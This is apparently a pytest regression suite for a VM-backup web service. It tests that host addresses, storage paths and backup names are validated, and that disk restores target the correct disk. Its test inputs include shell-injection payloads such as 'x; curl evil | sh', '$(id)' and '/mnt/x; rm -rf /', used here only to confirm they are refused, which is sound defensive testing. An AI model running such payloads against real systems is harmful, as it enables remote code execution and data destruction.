"""What an administrator types, or a request carries, must never become a shell command or a wrong disk.

Non-regression of the review of the code: the address of a host, the path of a storage and the name of a backup
were put in commands run by a shell without a check; a restore replaced the last disk of the machine when the
backup matched none; the removal of a connector always failed; the space of the deleted backups was never freed.
"""

import os
import re
import shlex
from types import SimpleNamespace
from uuid import UUID, uuid4

import pytest

os.environ.setdefault("JWT_SECRET", "x" * 40)

from app import safety  # noqa: E402

INJECTIONS = ["x; curl evil | sh", "x$(id)", "x`id`", "x && ls", "x|ls", "x\nls", "x ls", "x>/tmp/a", "../x", "-delete", ""]


@pytest.mark.parametrize("name", ["vda_x_1", "hda_b85cb56d-fcc8-4560-9ccf-30bfb43ba167_1793100652",
                                  "files_Users-Public-Documents_1793100540", "a.b-c_1"])
def test_the_names_of_real_backups_are_accepted(name):
    assert safety.valid_backup_name(name)


@pytest.mark.parametrize("name", INJECTIONS + [".", "..", None, 5])
def test_a_name_that_is_not_plain_is_refused(name):
    assert not safety.valid_backup_name(name)


@pytest.mark.parametrize("address", ["192.168.1.5", "192.0.2.195", "kvm-1", "kvm-1.lab.example.com", "::1", "fe80::1"])
def test_an_ip_address_or_a_host_name_is_accepted(address):
    assert safety.valid_address(address)


@pytest.mark.parametrize("address", ["1.1.1.1; curl evil|sh #", "a b", "$(id)", "x`id`", "a&b", "-oProxyCommand=x", "",
                                     "x" * 300, None, "a..b", ".a"])
def test_an_address_that_is_not_one_is_refused(address):
    assert not safety.valid_address(address)


@pytest.mark.parametrize("path", ["/mnt/backup_storage", "/mnt/nfs/backup-1", "/srv/borg_repos/a.b", "/mnt/a@b"])
def test_a_plain_absolute_path_is_accepted_for_a_storage(path):
    assert safety.valid_storage_path(path)


@pytest.mark.parametrize("path", ["relative/path", "/mnt/x; rm -rf /", "/mnt/$(id)", "/mnt/a b", "/a/../b", "/mnt/`id`",
                                  "/mnt/a\nb", "", "/" + "a" * 600, None])
def test_a_path_that_could_run_a_command_is_refused_for_a_storage(path):
    assert not safety.valid_storage_path(path)


# -- the models of the requests ---------------------------------------------------------------------------------------

def test_a_host_with_an_address_that_is_a_command_is_refused():
    host = pytest.importorskip("app.routes.host")
    pool = str(uuid4())
    ok = host.items_create_host(hostname="kvm", ip_address="192.168.1.5", pool_id=pool)
    assert ok.ip_address == "192.168.1.5"
    for address in ("1.1.1.1; curl evil|sh #", "$(id)", "a b"):
        with pytest.raises(ValueError):
            host.items_create_host(hostname="kvm", ip_address=address, pool_id=pool)
        with pytest.raises(ValueError):
            host.items_update_host(ip_address=address)
    # An update that does not change the address is fine.
    assert host.items_update_host(hostname="x").ip_address is None


def test_a_storage_with_a_path_that_is_a_command_is_refused():
    storage = pytest.importorskip("app.routes.storage")
    assert storage.items_storage(name="s", path="/mnt/backup_storage").path == "/mnt/backup_storage"
    for path in ("/mnt/x; rm -rf /", "relative", "/a/../b", "/mnt/$(id)"):
        with pytest.raises(ValueError):
            storage.items_storage(name="s", path=path)


def test_a_restore_request_is_checked():
    task = pytest.importorskip("app.routes.task")
    vm = str(uuid4())
    ok = task.restorebackup_start(virtual_machine_id=vm, backup_name="vda_x_1792000000")
    assert ok.backup_name == "vda_x_1792000000"
    for name in ("x;ls", "$(id)", "-x", "a b"):
        with pytest.raises(ValueError):
            task.restorebackup_start(virtual_machine_id=vm, backup_name=name)
    # A backup of folders or files is not a disk.
    with pytest.raises(ValueError, match="not a disk"):
        task.restorebackup_start(virtual_machine_id=vm, backup_name="files_etc-ssh_1792000000")
    with pytest.raises(ValueError):
        task.restorebackup_start(virtual_machine_id="not-a-uuid", backup_name="vda_x_1")


# -- the routes: a viewer or an editor can not reach a shell ---------------------------------------------------------

@pytest.fixture(scope="module")
def client():
    from fastapi.testclient import TestClient
    from sqlmodel import SQLModel

    from app.database import init_db_connection, migrate_user_table
    from app.initialized import fastapi_app
    import importlib
    from pathlib import Path

    import app.routes as routes_package
    # The folders have no __init__.py (app/routes/auth), so the files are listed rather than the packages.
    for file in sorted(Path(routes_package.__path__[0]).rglob("*.py")):
        name = "app.routes." + ".".join(file.relative_to(routes_package.__path__[0]).with_suffix("").parts)
        try:
            importlib.import_module(name)
        except ImportError:  # a system library (libvirt) that this machine does not have
            pass
    engine = init_db_connection()
    SQLModel.metadata.create_all(engine)
    migrate_user_table(engine)
    return TestClient(fastapi_app, raise_server_exceptions=False)


def require_route(method, path):
    """The routes of the machines need libvirt: a computer without it does not load them."""
    from app.initialized import fastapi_app
    if not any(getattr(route, "path", None) == path and method in (getattr(route, "methods", None) or ())
               for route in fastapi_app.routes):
        pytest.skip(f"{method} {path} is not loaded here (a system library is missing)")


BACKUP_ROUTE = "/api/v1/virtualmachines/{virtual_machine_id}/backups/{backup_name}"
RESTORE_ROUTE = "/api/v1/tasks/restore/{virtual_machine_id}"


def login_as(client, name, role):
    from sqlmodel import Session

    from app.auth import password
    from app.database import User
    with Session(password.get_engine()) as session:
        if password.find_user_by_name(session, name) is None:
            session.add(User(name=name, password_hash=password.hash_password("password1"), role=role))
            session.commit()
    response = client.post("/api/v1/auth/password/login", json={"username": name, "password": "password1"})
    assert response.status_code == 200, response.text
    return {"Authorization": f"Bearer {response.json()['access_token']}"}


@pytest.mark.parametrize("name", ["x%3B%20curl%20evil%7Csh", "x%24%28id%29", "x%60id%60"])
def test_a_viewer_can_not_inject_a_command_through_the_name_of_a_backup(client, name):
    require_route("GET", BACKUP_ROUTE)
    headers = login_as(client, "viewer-safe", "viewer")
    response = client.get(f"/api/v1/virtualmachines/{uuid4()}/backups/{name}", headers=headers)
    assert response.status_code == 422, response.text


@pytest.mark.parametrize("name", ["x%3B%20curl%20evil%7Csh", "x%24%28id%29"])
def test_an_editor_can_not_inject_a_command_through_the_name_of_a_backup_to_delete(client, name):
    require_route("DELETE", BACKUP_ROUTE)
    headers = login_as(client, "editor-safe", "editor")
    response = client.delete(f"/api/v1/virtualmachines/{uuid4()}/backups/{name}", headers=headers)
    assert response.status_code == 422, response.text


def test_a_restore_request_that_names_another_machine_than_its_address_is_refused(client):
    require_route("POST", RESTORE_ROUTE)
    headers = login_as(client, "editor-safe", "editor")
    response = client.post(f"/api/v1/tasks/restore/{uuid4()}", headers=headers,
                           json={"virtual_machine_id": str(uuid4()), "backup_name": "vda_x_1"})
    assert response.status_code == 422, response.text


def test_a_restore_request_with_a_command_as_backup_name_is_refused(client):
    require_route("POST", RESTORE_ROUTE)
    headers = login_as(client, "editor-safe", "editor")
    vm = str(uuid4())
    response = client.post(f"/api/v1/tasks/restore/{vm}", headers=headers,
                           json={"virtual_machine_id": vm, "backup_name": "vda_x_1; curl evil|sh"})
    assert response.status_code == 422, response.text


# -- the restore of a disk --------------------------------------------------------------------------------------------

def restore_environment(monkeypatch, tmp_path, commands, pool_connector=None):
    pytest.importorskip("libvirt")
    from app import file_browser, restore
    monkeypatch.setattr(restore.storage, "retrieveStoragePathFromHostBackupPolicy", lambda info: {"path": str(tmp_path)})
    monkeypatch.setattr(restore.shell, "subprocess_run", lambda command: commands.append(command) or "")
    monkeypatch.setattr(restore.shell, "subprocess_popen", lambda command: commands.append(command) or "")
    monkeypatch.setattr(restore.shell, "os_system", lambda command: commands.append(command))
    monkeypatch.setattr(restore.os, "chdir", lambda path: None)
    monkeypatch.setattr(restore, "is_nfs", lambda path: True)
    monkeypatch.setattr(file_browser, "archive_size", lambda *arguments: 1)
    monkeypatch.setattr(file_browser, "check_free_space", lambda *arguments: None)
    monkeypatch.setattr(restore.pool, "filter_pool_by_id", lambda pool_id: SimpleNamespace(connector_id=pool_connector))
    stopped = []
    monkeypatch.setattr(restore.kvm_manage_vm, "stop_vm", lambda *arguments: stopped.append(arguments))
    monkeypatch.setattr(restore.kvm_manage_vm, "start_vm", lambda *arguments: None)
    return restore, stopped


KVM_VM = {"name": "web-01", "uuid": "vm-1", "host": "h1", "pool_id": "p1", "cloudstack_instance": False}


def test_a_backup_that_matches_no_disk_of_the_machine_replaces_nothing(monkeypatch, tmp_path):
    commands = []
    restore, stopped = restore_environment(monkeypatch, tmp_path, commands)
    disks = [{"device": "vda", "source": "/var/lib/libvirt/images/a.qcow2"},
             {"device": "vdb", "source": "/var/lib/libvirt/images/b.qcow2"}]

    # The backup is of a disk, vdc, that the machine does not have (any more): the last disk must not be replaced.
    with pytest.raises(ValueError, match="Unable to match"):
        restore.restore_task(None, KVM_VM, {"pool_id": "p1"}, disks, "vdc_x_1792000000")

    assert stopped == []
    # The extraction in the folder of the restore is harmless: what must not happen is the copy on a disk.
    assert not any(".tmp" in command or command.startswith("chmod") for command in commands)


def test_a_backup_of_a_disk_of_the_machine_is_restored_on_that_disk(monkeypatch, tmp_path):
    commands = []
    restore, stopped = restore_environment(monkeypatch, tmp_path, commands)
    disks = [{"device": "vda", "source": "/var/lib/libvirt/images/a.qcow2"},
             {"device": "vdb", "source": "/var/lib/libvirt/images/b.qcow2"}]

    restore.restore_task(None, KVM_VM, {"pool_id": "p1"}, disks, "vda_x_1792000000")

    assert len(stopped) == 1
    moved = [command for command in commands if command.startswith("mv /var") or "a.qcow2" in command]
    assert any("/var/lib/libvirt/images/a.qcow2" in command for command in moved)
    assert not any("b.qcow2" in command for command in commands)


def test_the_name_of_a_backup_is_quoted_where_it_is_given_to_borg(monkeypatch, tmp_path):
    commands = []
    restore, stopped = restore_environment(monkeypatch, tmp_path, commands)
    disks = [{"device": "vda", "source": "/var/lib/libvirt/images/a.qcow2"}]
    restore.restore_task(None, KVM_VM, {"pool_id": "p1"}, disks, "vda_x_1792000000")
    extract = next(command for command in commands if "borg extract" in command)
    assert shlex.split(extract)[-1].endswith("::vda_x_1792000000")


@pytest.mark.parametrize("name", ["vda_x_1; curl evil|sh", "files_etc_1792000000", "$(id)"])
def test_a_restore_refuses_a_name_that_is_not_a_disk_backup_before_touching_anything(monkeypatch, tmp_path, name):
    commands = []
    restore, stopped = restore_environment(monkeypatch, tmp_path, commands)
    with pytest.raises(ValueError):
        restore.restore_task(None, KVM_VM, {"pool_id": "p1"}, [{"device": "vda", "source": "/x/a.qcow2"}], name)
    assert stopped == []
    assert not any("borg extract" in command for command in commands)


def test_a_cloudstack_machine_that_runs_is_not_restored_under_its_feet(monkeypatch, tmp_path):
    commands = []
    restore, stopped = restore_environment(monkeypatch, tmp_path, commands, pool_connector="c1")
    monkeypatch.setattr(restore.connectors, "filter_connector_by_id", lambda connector_id: SimpleNamespace(id=connector_id))
    # The hypervisor did not answer, so the machine is listed by CloudStack only (no "host"), and it runs.
    running = {"name": "i-2-1-VM", "uuid": "vm-9", "pool_id": "p1", "cloudstack_instance": True, "state": "Running"}
    with pytest.raises(ValueError, match="stop it before"):
        restore.restore_task(None, running, {"pool_id": "p1"}, [{"device": "vda", "source": None, "storageid": "s"}],
                             "vda_x_1792000000")
    assert not any(".tmp" in command or command.startswith("chmod") for command in commands)


# -- the connectors ---------------------------------------------------------------------------------------------------

def test_a_connector_that_no_pool_uses_can_be_removed_and_one_that_a_pool_uses_can_not():
    import tempfile
    os.environ.setdefault("SQLITE_DIRECTORY", tempfile.mkdtemp())
    connectors = pytest.importorskip("app.routes.connectors")
    from sqlmodel import Session, SQLModel

    from app import database
    from app.database import Pools
    engine = database.init_db_connection()
    SQLModel.metadata.create_all(engine)

    free = connectors.api_create_connector.run("free", "http://cs/client/api", "key", "secret")
    used = connectors.api_create_connector.run("used", "http://cs/client/api", "key2", "secret2")
    with Session(engine) as session:
        session.add(Pools(name="pool-of-used", connector_id=UUID(used["id"])))
        session.commit()

    # Before the fix both raised an AttributeError (the hosts have no connector).
    assert connectors.api_delete_connector.run(free["id"]) == {"state": "SUCCESS"}
    from fastapi import HTTPException
    with pytest.raises(HTTPException) as refusal:
        connectors.api_delete_connector.run(used["id"])
    assert refusal.value.status_code == 409 and "pool-of-used" in refusal.value.detail


# -- the space of the deleted backups ---------------------------------------------------------------------------------

def test_the_space_of_the_backups_deleted_by_a_policy_is_freed(monkeypatch):
    borg_core = pytest.importorskip("app.borg.borg_core")
    commands = []
    monkeypatch.setattr(borg_core.shell, "subprocess_run", lambda command: commands.append(command) or "")
    borg_core.compact_repository("/mnt/backup_storage/web 01")
    assert len(commands) == 1
    words = shlex.split(commands[0])
    # The path is quoted: a space in it stays one argument. Borg frees space only with compact since 1.2.
    assert words[:2] == ["borg", "compact"] and words[-1] == "/mnt/backup_storage/web 01"
    assert "--lock-wait" in words


def test_a_compaction_that_fails_does_not_fail_the_backup(monkeypatch):
    borg_core = pytest.importorskip("app.borg.borg_core")

    def broken(command):
        raise RuntimeError("repository locked")
    monkeypatch.setattr(borg_core.shell, "subprocess_run", broken)
    borg_core.compact_repository("/mnt/backup_storage/web-01")


def test_a_repository_that_a_backup_is_writing_in_is_skipped_by_the_cleaning_and_is_not_a_failure(tmp_path):
    from app import cleanup
    repository = tmp_path / "web-01"
    repository.mkdir()
    (repository / "config").write_text("[repository]")
    (repository / "lock.exclusive").mkdir()
    log = cleanup.Log()
    result = cleanup.prune_repository(repository, 30, log)
    assert result == {"archives_deleted": 0, "freed_bytes": 0, "errors": 0}
    assert "in use" in log.text()


def test_a_cleaning_that_can_not_be_started_ends_its_run_and_answers_503(monkeypatch):
    from fastapi import HTTPException

    from app import cleanup
    routes = pytest.importorskip("app.routes.cleanup")
    ended = []
    monkeypatch.setattr(cleanup, "finish_run", lambda run_id, status, summary, log: ended.append((run_id, status, summary)))

    class Broker:
        def apply_async(self, args):
            raise ConnectionError("redis is down")
    with pytest.raises(HTTPException) as caught:
        routes.start_or_fail("run-1", Broker(), ("x",))
    assert caught.value.status_code == 503
    # The run is not left "running": it would block every cleaning of the storage for 12 hours.
    assert ended and ended[0][0] == "run-1" and ended[0][1] == "failed" and ended[0][2]["errors"] == 1


# -- the policies -----------------------------------------------------------------------------------------------------

def test_a_request_without_enabled_does_not_switch_a_policy_off():
    """The page of the policies sent no `enabled` when it saved a policy: the backups were switched off."""
    source = open(os.path.join(os.path.dirname(__file__), "..", "app", "routes", "backup_policy.py"), encoding="utf-8").read()
    update = source[source.index("def api_update_backup_policy"):]
    assert re.search(r"if enabled is None:\s*\n\s*enabled = data_backup_policy\.enabled == 1", update)


def test_a_policy_can_be_enabled_with_every_kind_of_day_of_week():
    """`0 22 * * *` (every day) made the activation fail with int('*'): the weekday is converted like the cleanings."""
    from app import cleanup
    assert cleanup.celery_day_of_week("*") == "*"
    assert cleanup.celery_day_of_week("*/2") == "*/2"
    assert cleanup.celery_day_of_week("1-5") == "1,2,3,4,5"
    assert cleanup.celery_day_of_week("0,7") == "0"
    source = open(os.path.join(os.path.dirname(__file__), "..", "app", "routes", "backup_policy.py"), encoding="utf-8").read()
    update = source[source.index("def api_update_backup_policy"):]
    assert "cleanup.celery_day_of_week(split_cron[4])" in update
    assert "int(d)" not in update


def test_a_libvirt_machine_of_a_pool_linked_to_cloudstack_is_stopped_and_started_by_libvirt(monkeypatch, tmp_path):
    commands = []
    restore, stopped = restore_environment(monkeypatch, tmp_path, commands, pool_connector="c1")
    monkeypatch.setattr(restore.connectors, "filter_connector_by_id", lambda connector_id: SimpleNamespace(id=connector_id))
    started = []
    monkeypatch.setattr(restore.kvm_manage_vm, "start_vm", lambda *arguments: started.append(arguments))
    cloudstack_calls = []
    monkeypatch.setattr(restore.cs_vm_command, "stop_vm", lambda *arguments: cloudstack_calls.append("stop"))
    monkeypatch.setattr(restore.cs_vm_command, "start_vm", lambda *arguments: cloudstack_calls.append("start"))

    # The pool has a connector, but the machine is a plain libvirt one: CloudStack does not know it.
    restore.restore_task(None, KVM_VM, {"pool_id": "p1"},
                         [{"device": "vda", "source": "/var/lib/libvirt/images/a.qcow2"}], "vda_x_1792000000")

    assert len(stopped) == 1 and len(started) == 1
    assert cloudstack_calls == []


def test_a_cloudstack_machine_is_stopped_and_started_by_cloudstack(monkeypatch, tmp_path):
    commands = []
    restore, stopped = restore_environment(monkeypatch, tmp_path, commands, pool_connector="c1")
    monkeypatch.setattr(restore.connectors, "filter_connector_by_id", lambda connector_id: SimpleNamespace(id=connector_id))
    cloudstack_calls = []
    monkeypatch.setattr(restore.cs_vm_command, "stop_vm", lambda *arguments: cloudstack_calls.append("stop"))
    monkeypatch.setattr(restore.cs_vm_command, "start_vm", lambda *arguments: cloudstack_calls.append("start"))
    machine = dict(KVM_VM, cloudstack_instance=True)

    restore.restore_task(None, machine, {"pool_id": "p1"},
                         [{"device": "vda", "source": "/var/lib/libvirt/images/a.qcow2"}], "vda_x_1792000000")

    assert cloudstack_calls == ["stop", "start"]
    assert stopped == []
